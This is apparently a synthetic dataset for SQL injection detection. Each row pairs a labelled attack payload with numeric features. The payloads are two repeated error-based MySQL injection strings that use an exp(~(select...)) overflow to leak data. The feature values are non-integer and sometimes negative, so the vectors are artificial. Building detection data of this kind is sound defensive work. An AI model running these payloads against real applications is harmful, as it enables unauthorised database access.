id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000162,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.718238314028355,257.3070983886719,73.63457489013672,38.114418029785156,97.01110076904297,7.020394325256348,76.14412689208984,40.33540725708008,1.2595720291137695,0.2863844633102417,0.14923374354839325,0.3945407271385193,0.13094928860664368,3.7386648654937744,1.2479915618896484,0.8436586260795593,0.6551710963249207,0.108420729637146,0.037770722061395645,0.0065438468009233475,9.594769477844238,9.556031227111816,2.7096829414367676,0.10868861526250839,2.012787342071533,0.14372344315052032,0.1044946014881134,0.15279649198055267,0.034334223717451096,0.5644177198410034,0.044226840138435364,-0.11408741772174835,1.4727849960327148,0.18195810914039612,0.3190954029560089,2.247016668319702,6.978107929229736,0.7033620476722717,1.8362964391708374,0.10862256586551666,0.4876963198184967,0.9861278533935547,0.028164517134428024,0.016176987439393997,0.10227099806070328,0.0102849081158638,-0.30028074979782104,0.4684920310974121,0.42361709475517273,0.4312721788883209,0.2150159627199173,0.37529250979423523,-0.2928076684474945,0.12434121966362,0.26619741320610046,0.048457007855176926,0.04117848351597786,0.017907530069351196,0.08361823111772537,0.0926077663898468,0.015176713466644287,0.23338621854782104,-0.02537793666124344,-0.05367443710565567,0.20608940720558167,0.006576076149940491,0.5219177007675171,0.03959362208843231,0.07851755619049072,-0.1408986747264862,-0.010633505880832672,-0.19837673008441925,-0.050537001341581345,0.02361466735601425,0.049090426415205,0.014882275834679604,1.212630033493042,0.30974259972572327,-0.09184038639068604,0.012151575647294521,0.15549811720848083,7.983335018157959,0.8055638670921326,0.18533667922019958,0.0011102360440418124,0.5163857340812683,-0.22290772199630737,0.05181990563869476,0.02858215570449829
GAN_000163,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.899056837932016,257.5835876464844,73.4614486694336,36.52543258666992,99.726806640625,5.033252239227295,76.83238983154297,42.44314193725586,0.999243974685669,0.2781047821044922,0.1487761288881302,0.4058971703052521,0.12755629420280457,3.6592323780059814,0.9672650098800659,1.2948273420333862,0.8707174062728882,0.11509336531162262,0.09391020983457565,0.006924200803041458,9.355974197387695,9.850502967834473,2.453296661376953,0.1513737291097641,1.8775657415390015,0.1720251888036728,0.1513386368751526,0.030382122844457626,0.12030333280563354,0.5481654405593872,-0.07146558165550232,0.0009387582540512085,1.435815691947937,0.13716983795166016,0.3426050841808319,2.2683334350585938,7.032778739929199,1.001931071281433,1.942137598991394,-0.0074571967124938965,0.4694580137729645,1.0004372596740723,-0.13477090001106262,0.052927955985069275,0.14405682682991028,-0.25452038645744324,-0.20885536074638367,0.5650241374969482,0.4358586370944977,0.47401538491249084,0.1987571269273758,0.2805325984954834,-0.30230388045310974,0.34509867429733276,0.20006899535655975,0.04889503866434097,0.07033124566078186,0.2343958616256714,0.01146811991930008,0.08768786489963531,0.15094691514968872,0.11984826624393463,-0.29461973905563354,-0.04201984778046608,0.3164207339286804,-0.08564344793558121,0.5485361218452454,0.1642981916666031,0.1447935849428177,-0.00796043872833252,0.004176974296569824,-0.3354770541191101,-0.049960266798734665,0.04072962701320648,0.07355973869562149,0.009509183466434479,1.445088505744934,0.2502743601799011,-0.008103907108306885,-0.009368070401251316,0.09342711418867111,7.23930025100708,0.7898058295249939,0.14966844022274017,-0.03690620884299278,0.5687460899353027,0.05357441306114197,-0.19788670539855957,-0.021400004625320435
GAN_000164,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.629100171178406,261.0028381347656,73.99058532714844,36.34853744506836,100.73963165283203,-1.1233947277069092,75.38041687011719,42.02537536621094,0.8454205989837646,0.31152138113975525,0.1627964824438095,0.399850994348526,0.130402609705925,3.774484872817993,1.4851858615875244,0.8745970726013184,0.579342782497406,0.1118159070611,0.07734181731939316,0.20256240665912628,9.745146751403809,9.236917495727539,3.007953643798828,0.06926704943180084,1.8268451690673828,0.1505153626203537,-0.04618731141090393,-0.05917227640748024,0.06626144051551819,0.5406437516212463,-0.03125569969415665,-0.2600826919078827,1.6626399755477905,-0.007802747189998627,0.32678866386413574,2.097120523452759,7.813385963439941,1.264445424079895,2.2276902198791504,0.14877912402153015,0.4030613899230957,0.7993565201759338,-0.012616463005542755,0.056702371686697006,0.05647221952676773,-0.20478609204292297,0.07976558804512024,0.4639357030391693,0.46720293164253235,0.5606826543807983,0.2549020051956177,0.25741255283355713,-0.03926604986190796,-0.07176234573125839,0.14314165711402893,0.046143557876348495,0.052773695439100266,0.052952926605939865,0.07718905061483383,0.3280585706233978,-0.16006553173065186,-0.06298696249723434,-0.0169634148478508,0.17988909780979156,0.17212612926959991,-0.11835011839866638,0.45145753026008606,0.232937291264534,0.08560393005609512,0.09530612826347351,0.04727685824036598,-0.11679361015558243,0.23711450397968292,0.046987153589725494,0.06430912017822266,-0.0029165109153836966,1.3501811027526855,0.4112261235713959,-0.14510469138622284,0.08132833242416382,0.17797093093395233,7.680610179901123,0.8944602012634277,0.14178749918937683,0.03438572213053703,0.6429389715194702,0.2242688536643982,-0.15321755409240723,0.10793973505496979
GAN_000165,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.794614362659103,260.57452392578125,72.33241271972656,35.786598205566406,94.2637939453125,4.4926228523254395,77.36042022705078,41.3884391784668,1.1419445276260376,0.2782379686832428,0.15119005739688873,0.398257851600647,0.13034674525260925,3.7079010009765625,1.126400351524353,0.963073194026947,0.5960631966590881,0.12417921423912048,0.04567309096455574,-0.216141939163208,9.975809097290039,9.374323844909668,1.9340949058532715,0.1316409707069397,2.0029077529907227,0.1671561896800995,0.07484282553195953,0.028581436723470688,0.03658042848110199,0.5397942662239075,0.018690455704927444,-0.10588903725147247,1.5045464038848877,0.09768158942461014,0.296627938747406,2.185100555419922,7.540356159210205,0.8634597063064575,2.0486624240875244,0.15974828600883484,0.4846929609775543,0.9556031227111816,0.009939096868038177,0.0372297577559948,0.2205791175365448,-0.19847530126571655,-0.1540345549583435,0.4101265072822571,0.38788166642189026,0.5134742856025696,0.23240096867084503,0.34201779961586,-0.21791422367095947,0.2017328441143036,0.2458067387342453,0.021565843373537064,0.03795689716935158,-0.04112963378429413,0.0612935796380043,0.2248610258102417,-0.049174223095178604,0.1258002668619156,-0.06831366568803787,-0.037546977400779724,0.2884852886199951,0.08548767864704132,0.5726858973503113,0.20339731872081757,-0.030593059957027435,-0.127751886844635,-0.011522583663463593,-0.1788683831691742,0.09000299125909805,-0.015933647751808167,0.06096324324607849,0.015174581669270992,1.1602487564086914,0.2781338691711426,-0.11734013259410858,0.062245555222034454,0.20311687886714935,7.99642276763916,0.8416230082511902,0.14224115014076233,0.019401591271162033,0.6055723428726196,-0.019986551254987717,-0.05386166647076607,0.0610431432723999
GAN_000166,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.951986870448233,260.90966796875,62.88794708251953,37.6558723449707,95.00758361816406,-0.6510846018791199,82.8560791015625,45.18341827392578,1.092195987701416,0.263433039188385,0.16442522406578064,0.40316513180732727,0.13129620254039764,3.6381359100341797,0.9296064376831055,1.1425026655197144,0.6035228967666626,0.20353101193904877,0.015805559232831,0.03415808081626892,10.273510932922363,9.692617416381836,1.9323920011520386,0.11750854551792145,1.9480031728744507,0.17916256189346313,-0.04270581156015396,-0.05992581322789192,-0.0028722260612994432,0.5501526594161987,-0.052716828882694244,-0.0727834701538086,1.3071235418319702,0.0010240785777568817,0.30217015743255615,2.406708240509033,7.89859676361084,0.8040561676025391,2.0097453594207764,0.1716097593307495,0.48649266362190247,1.0493890047073364,-0.2656542956829071,0.009759637527167797,0.4885786175727844,-0.23317471146583557,-0.256893515586853,0.4997223913669586,0.4154514670372009,0.5650455355644226,0.08714155107736588,0.25633400678634644,-0.2836931645870209,0.3808991611003876,0.2234634906053543,-0.007391724735498428,0.04067366570234299,0.3267408609390259,0.12640896439552307,0.24933266639709473,0.11151718348264694,0.06143559515476227,-0.3779867887496948,0.1144046038389206,0.34269118309020996,0.11888560652732849,0.5748957991600037,0.363486111164093,0.022943580523133278,-0.07629413157701492,-0.04174168407917023,-0.15842190384864807,0.078847736120224,0.025970079004764557,0.09352309256792068,0.01787037029862404,1.394237995147705,0.3270932137966156,-0.19991345703601837,0.06488827615976334,0.2237054854631424,7.971907615661621,0.9483233690261841,0.20694628357887268,-0.03156093880534172,0.4929278790950775,-0.07758216559886932,0.018432877957820892,-0.10827520489692688
GAN_000167,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.899324118648707,261.21417236328125,71.24170684814453,38.01537322998047,93.79732513427734,4.130081653594971,75.85778045654297,41.11806106567383,0.9861502647399902,0.2707637548446655,0.14582623541355133,0.39701104164123535,0.1306319534778595,3.716404914855957,1.3331605195999146,0.9684458374977112,0.7388913631439209,0.10644499957561493,0.06484149396419525,-0.03293861076235771,9.990982055664062,9.834431648254395,2.474736213684082,0.05830377712845802,1.8717482089996338,0.16993822157382965,0.10055842995643616,0.05642048642039299,0.11622337251901627,0.6304846405982971,-0.02870863676071167,-0.13537278771400452,1.3998041152954102,0.21271148324012756,0.26846393942832947,2.2734124660491943,7.5564494132995605,0.8743125200271606,1.8149588108062744,-0.004305988550186157,0.5123854875564575,1.0665783882141113,0.11559510231018066,0.027814403176307678,0.24937134981155396,-0.14925920963287354,-0.1477009505033493,0.521527111530304,0.445669949054718,0.5148125290870667,0.2728281021118164,0.3619658648967743,-0.1574133336544037,0.19824039936065674,0.2093556672334671,0.06911175698041916,0.053747717291116714,0.19835905730724335,-0.14171145856380463,0.21014317870140076,0.05230175703763962,0.15604226291179657,-0.15637502074241638,-0.006746970117092133,0.25984394550323486,0.02026401087641716,0.4810025691986084,0.1472070962190628,0.08089928328990936,-0.023494742810726166,-0.14061884582042694,-0.28599539399147034,0.02629535272717476,0.030692115426063538,0.05256816744804382,0.015121218748390675,1.2742403745651245,0.1904550939798355,-0.10021267831325531,0.042931534349918365,0.16966833174228668,7.908520698547363,0.8431260585784912,0.17674222588539124,-0.015913164243102074,0.5796289443969727,0.02474067360162735,-0.04273732006549835,0.05686651170253754
GAN_000168,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.844384778709016,260.4283752441406,67.75605773925781,36.4188232421875,102.92606353759766,3.8993194103240967,82.75148010253906,43.72811508178711,1.0161539316177368,0.2672818601131439,0.16085627675056458,0.39388492703437805,0.1293351948261261,3.7391936779022217,1.1028722524642944,0.9333393573760986,0.5786142945289612,0.16334806382656097,0.03312912955880165,0.004377465695142746,10.19428539276123,9.781916618347168,2.4094905853271484,0.03197387233376503,1.9239070415496826,0.1652059257030487,-0.0497453473508358,-0.08377242833375931,0.03263416141271591,0.6018050312995911,0.07500681281089783,-0.23231938481330872,1.6843024492263794,0.0038324184715747833,0.31827905774116516,2.2182295322418213,8.017507553100586,0.8920706510543823,1.9669578075408936,0.12903237342834473,0.5075770020484924,0.9758906364440918,-0.030162274837493896,0.04015317186713219,0.3091450333595276,-0.20476189255714417,0.007768675684928894,0.3699018955230713,0.5146682858467102,0.6022017002105713,0.15385781228542328,0.23582161962985992,0.059776950627565384,0.08994564414024353,0.16642802953720093,0.020883113145828247,0.058069296181201935,0.03828556463122368,0.03649585694074631,0.3073659837245941,-0.0011587515473365784,0.05803510546684265,-0.003683917224407196,-0.06788314878940582,0.2430688440799713,0.016438309103250504,0.5027689337730408,0.24230419099330902,0.05946861207485199,-0.03892771154642105,-0.1891898810863495,-0.05032336339354515,0.10098405927419662,0.012461721897125244,0.06739199161529541,0.008658911101520061,1.3478118181228638,0.35820502042770386,-0.1673479676246643,0.08564364165067673,0.23659057915210724,8.234739303588867,0.9342862963676453,0.18410643935203552,0.012833057902753353,0.5506564378738403,0.07499104738235474,0.08854667842388153,0.19171445071697235
GAN_000169,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.025553944108349,255.8174285888672,71.38042449951172,35.90116500854492,102.76874542236328,-0.16044208407402039,79.1019287109375,45.42981719970703,0.9356420040130615,0.2552189528942108,0.15904834866523743,0.4029524326324463,0.12734892964363098,3.7164628505706787,1.274233102798462,1.3245983123779297,0.7744733691215515,0.1850711852312088,0.10159100592136383,0.10781791806221008,10.72110366821289,10.158276557922363,2.8741109371185303,-0.05449845641851425,1.762387752532959,0.20284688472747803,0.021020423620939255,-0.18099752068519592,0.06459551304578781,0.7618041038513184,-0.018653519451618195,-0.22017545998096466,1.578604817390442,0.014346929267048836,0.36688339710235596,2.2431583404541016,7.7435407638549805,0.8302004337310791,2.1008269786834717,-0.006757289171218872,0.5156532526016235,1.003466010093689,-0.1748761534690857,0.04872915521264076,0.220056414604187,-0.2507241368293762,-0.051515817642211914,0.4608885943889618,0.582581639289856,0.6329265236854553,0.0677809789776802,0.1996588408946991,0.17293208837509155,0.22111070156097412,0.13699251413345337,0.027154643088579178,0.06763046979904175,0.06702032685279846,0.052279360592365265,0.18503889441490173,0.14288437366485596,0.025757163763046265,-0.147245854139328,-0.06019001081585884,0.22027061879634857,-0.195011705160141,0.46078652143478394,0.2874704599380493,0.17241427302360535,0.15558549761772156,-0.1787029355764389,-0.06989037245512009,0.12370564043521881,0.15687543153762817,0.09028977155685425,-0.0014552583452314138,1.584932565689087,0.3579573631286621,-0.18797968327999115,-0.019601620733737946,0.20976535975933075,7.711259365081787,0.9873321652412415,0.18402482569217682,0.0032886515837162733,0.638308584690094,0.3095060884952545,0.17966419458389282,0.1801796704530716
GAN_000170,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.001667371133052,249.88681030273438,65.4947738647461,36.06216812133789,102.06184387207031,5.562521934509277,80.00111389160156,42.71771240234375,0.8693410158157349,0.2760048508644104,0.15878772735595703,0.39974120259284973,0.127241849899292,3.7391371726989746,0.9037902355194092,1.0699777603149414,0.6781250238418579,0.17328697443008423,0.09020417928695679,-0.015642747282981873,10.182645797729492,9.88275146484375,2.2184150218963623,0.11297382414340973,1.9462776184082031,0.24213801324367523,0.06748786568641663,0.034112598747015,0.1433015614748001,0.6825379729270935,0.015466682612895966,-0.32443636655807495,1.597339391708374,-0.09382983297109604,0.2639666795730591,2.3448026180267334,8.00357437133789,0.9770321846008301,2.0020339488983154,-0.10670652985572815,0.5363572835922241,0.9126341342926025,0.0037165433168411255,0.06531672924757004,0.2974378764629364,-0.38341787457466125,0.03211104869842529,0.4658553898334503,0.5508253574371338,0.5867426991462708,0.27813634276390076,0.19379179179668427,0.014365043491125107,0.20877927541732788,0.18321827054023743,0.06175241991877556,0.04964326694607735,0.05883467569947243,-0.20430819690227509,0.14868704974651337,0.1824401617050171,-0.02214636281132698,-0.1904245913028717,-0.04106493666768074,0.2552817463874817,0.04829886183142662,0.4476034641265869,0.23932306468486786,0.06645254790782928,0.12410929799079895,-0.22297975420951843,-0.21453708410263062,0.08883509039878845,-0.11036069691181183,0.06799791753292084,0.006860850378870964,1.4184949398040771,0.27055445313453674,-0.08176225423812866,0.1102343276143074,0.1871364861726761,7.982401371002197,0.8491587042808533,0.15572239458560944,0.013251512311398983,0.5981383919715881,0.10674940049648285,-0.06756429374217987,0.16855616867542267
GAN_000171,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.774673092475677,258.7168884277344,68.96182250976562,36.629486083984375,97.48625183105469,7.812242031097412,75.98188018798828,39.274166107177734,0.9321584105491638,0.29927775263786316,0.15033002197742462,0.39530280232429504,0.13204050064086914,3.743891954421997,1.1521409749984741,0.7968656420707703,0.5893731117248535,0.13430149853229523,0.07421658933162689,-0.04019355773925781,9.419391632080078,9.821070671081543,2.2782366275787354,0.14154012501239777,2.0311286449432373,0.17436428368091583,0.04572756960988045,0.13477572798728943,0.10152988880872726,0.6119138598442078,0.07259242981672287,-0.19295793771743774,1.452627182006836,0.04951399564743042,0.25897347927093506,2.3199870586395264,7.806859970092773,0.9552059173583984,1.8588252067565918,0.040965721011161804,0.42502638697624207,0.9722874164581299,0.02531101554632187,0.05210069194436073,0.1947440505027771,-0.139731302857399,-0.15503017604351044,0.4644836485385895,0.44934025406837463,0.4745539724826813,0.32743018865585327,0.30222922563552856,-0.14911490678787231,0.22375017404556274,0.23340365290641785,0.06067146733403206,0.019922126084566116,0.036897409707307816,-0.16578051447868347,0.12738510966300964,0.14660951495170593,0.009256742894649506,-0.07768461853265762,-0.009136255830526352,0.2334618866443634,0.0025941841304302216,0.4794361889362335,0.17938072979450226,0.021555468440055847,0.03512538969516754,-0.03651025891304016,-0.16504527628421783,0.03849543631076813,-0.005514368414878845,0.04685356840491295,0.011702925898134708,1.2536484003067017,0.2730000615119934,-0.07036174833774567,0.08524082601070404,0.20911499857902527,8.194798469543457,0.7846781015396118,0.14489702880382538,0.025129534304142,0.5512036085128784,-0.07210379838943481,-0.010243216529488564,-0.019718609750270844
GAN_000172,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.576848056565794,254.89285278320312,75.49263763427734,36.66744613647461,95.10662078857422,3.69258189201355,72.8396224975586,39.132286071777344,1.0896055698394775,0.2966400384902954,0.15618082880973816,0.3967075049877167,0.12982669472694397,3.735779047012329,1.347898244857788,0.8270102143287659,0.6002524495124817,0.10930543392896652,0.04965559393167496,-0.05112294852733612,9.379133224487305,9.673163414001465,2.4017043113708496,0.029511097818613052,1.9677773714065552,0.13158604502677917,-0.03278890997171402,0.10831315070390701,0.06431986391544342,0.5092605948448181,0.03455391526222229,-0.10442587733268738,1.5999623537063599,0.07545334100723267,0.3216436207294464,2.169384002685547,7.626245975494385,1.0336612462997437,2.023848056793213,0.15157455205917358,0.40350547432899475,0.8598597049713135,0.053937263786792755,0.05048276484012604,0.026328153908252716,-0.08404208719730377,-0.05721414089202881,0.42122742533683777,0.4056047201156616,0.44221508502960205,0.2885473072528839,0.31675732135772705,-0.11974550038576126,0.06843461096286774,0.22782756388187408,0.06698200851678848,0.05901677533984184,-0.006762079894542694,-0.045548439025878906,0.21032074093818665,-0.063526451587677,0.018953807651996613,0.017561063170433044,0.10514380037784576,0.2344072014093399,-0.005666438490152359,0.5889118313789368,0.05590081214904785,0.00945994071662426,-0.057857610285282135,0.11084280908107758,-0.15695540606975555,0.1406162679195404,0.0894182026386261,0.03981952741742134,0.008719852194190025,1.2127035856246948,0.37967076897621155,-0.1245424896478653,0.0794326588511467,0.2084670215845108,7.922987937927246,0.7622445821762085,0.13040634989738464,0.04736702889204025,0.6011746525764465,0.003105267882347107,-0.17238271236419678,0.009915731847286224
GAN_000173,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.66846763397169,262.5164489746094,70.6269760131836,35.696529388427734,99.00891876220703,2.185889959335327,81.38692474365234,44.1419792175293,1.0711268186569214,0.2625353932380676,0.16275712847709656,0.39960089325904846,0.13148075342178345,3.6750450134277344,1.2444244623184204,1.1551634073257446,0.6876105666160583,0.15634576976299286,0.04319014772772789,0.09750509262084961,8.984477043151855,9.528534889221191,2.3768177032470703,0.020420290529727936,1.9402682781219482,0.12535466253757477,-0.10025321692228317,-0.047331590205430984,0.021075280383229256,0.5971530675888062,0.03326402232050896,0.005838826298713684,1.474292516708374,0.15650728344917297,0.3565870523452759,2.1972742080688477,7.244657516479492,0.7738449573516846,1.8424724340438843,0.2366611808538437,0.3390118181705475,1.0319597721099854,-0.1833295226097107,0.04220042750239372,0.18427947163581848,-0.07711474597454071,-0.14471609890460968,0.4335901439189911,0.3989832401275635,0.48277443647384644,0.09018073230981827,0.28443774580955505,-0.12098915129899979,0.18402358889579773,0.16893690824508667,0.021412719041109085,0.04638570547103882,0.20997558534145355,0.12389134615659714,0.10493223369121552,0.03566557914018631,0.06098081171512604,-0.12356866151094437,0.02280917763710022,0.2557351291179657,-0.15898820757865906,0.567350447177887,0.2607536315917969,0.07312536239624023,0.02647712081670761,0.06286617368459702,-0.10181768238544464,0.03908050060272217,0.26299214363098145,0.07719820737838745,0.01362909097224474,1.4791483879089355,0.36707982420921326,-0.15894491970539093,0.00010188611486228183,0.2265327423810959,7.861722946166992,0.8777036070823669,0.20128706097602844,-0.009427805431187153,0.5370367765426636,0.029812708497047424,0.08038774877786636,-0.16929052770137787
GAN_000174,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.681038820477476,259.76080322265625,74.61711883544922,35.88972854614258,97.91871643066406,3.2423593997955322,71.80667114257812,43.29638671875,1.270505428314209,0.28543126583099365,0.1576462835073471,0.3993028700351715,0.13079234957695007,3.677870273590088,1.2600196599960327,0.9620996117591858,0.6782232522964478,0.15366168320178986,0.032272398471832275,0.09045753628015518,10.342288970947266,9.231870651245117,2.697047233581543,0.128871351480484,1.928501844406128,0.14105449616909027,0.09589989483356476,0.04962943121790886,-0.0189849641174078,0.5313423871994019,-0.08553086221218109,-0.010223984718322754,1.4583115577697754,0.14387255907058716,0.35826846957206726,2.207275867462158,7.3160576820373535,0.7822989225387573,2.0900967121124268,0.19659847021102905,0.4844292402267456,0.9962161779403687,-0.01861676573753357,0.01576216332614422,0.19854095578193665,-0.11316119134426117,-0.27606379985809326,0.41813430190086365,0.36933228373527527,0.47160664200782776,0.12158945947885513,0.3704562783241272,-0.16733863949775696,0.19448524713516235,0.23244093358516693,0.00408245250582695,0.06938067823648453,-0.0035535991191864014,0.12720176577568054,0.1439155638217926,-0.046331167221069336,0.07467460632324219,-0.14238590002059937,0.030243083834648132,0.26154574751853943,0.09694045782089233,0.5906097292900085,0.13320045173168182,0.07056345045566559,-0.06892802566289902,0.02302507683634758,-0.23860183358192444,-0.028385978192090988,0.0478171780705452,0.0622786320745945,0.01448404137045145,1.271006464958191,0.3537190854549408,-0.19429869949817657,0.008213154040277004,0.21175774931907654,7.965209484100342,0.8703842759132385,0.17265670001506805,-0.01308260578662157,0.5695576071739197,-0.13378795981407166,0.1058272048830986,-0.023506775498390198
GAN_000175,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.712819316210966,250.18972778320312,69.78475952148438,36.071571350097656,102.55947875976562,-2.353497266769409,80.19515228271484,47.48762130737305,1.2798218727111816,0.2509005665779114,0.16348692774772644,0.40299493074417114,0.1318792700767517,3.62576961517334,1.361930012702942,1.240943431854248,0.7588343024253845,0.20025017857551575,0.03334200382232666,0.21702152490615845,9.150788307189941,9.417394638061523,2.445272445678711,0.06413722783327103,1.8445851802825928,0.1201251894235611,-0.11434067040681839,-0.09687996655702591,-0.03185790404677391,0.5860735774040222,-0.09275944530963898,0.07412327080965042,1.4176627397537231,0.3365458548069,0.45195272564888,2.130242109298706,6.759921073913574,0.6435204148292542,1.9302054643630981,0.22144876420497894,0.3860390782356262,1.0467921495437622,-0.29736748337745667,0.01762813702225685,0.23964306712150574,-0.12624771893024445,-0.2480584681034088,0.43912044167518616,0.3913325369358063,0.4293610453605652,-0.040085189044475555,0.2914634644985199,-0.18589693307876587,0.1464603692293167,0.15096671879291534,-0.006632540374994278,0.04429224878549576,0.19476833939552307,0.13061115145683289,0.031324516981840134,-0.006130807101726532,0.14638136327266693,-0.20567214488983154,0.06894928216934204,0.2902570962905884,-0.056823838502168655,0.6261429190635681,0.20960552990436554,0.08837991952896118,-0.06604290753602982,0.04422425478696823,-0.2722948491573334,0.0013673044741153717,0.3492850661277771,0.07745008170604706,0.019097667187452316,1.557969093322754,0.28499895334243774,-0.27541667222976685,-0.022573672235012054,0.14177963137626648,7.572376728057861,0.9321069121360779,0.19436845183372498,-0.08716638386249542,0.5418086051940918,0.02176668494939804,0.20094501972198486,-0.2956346273422241
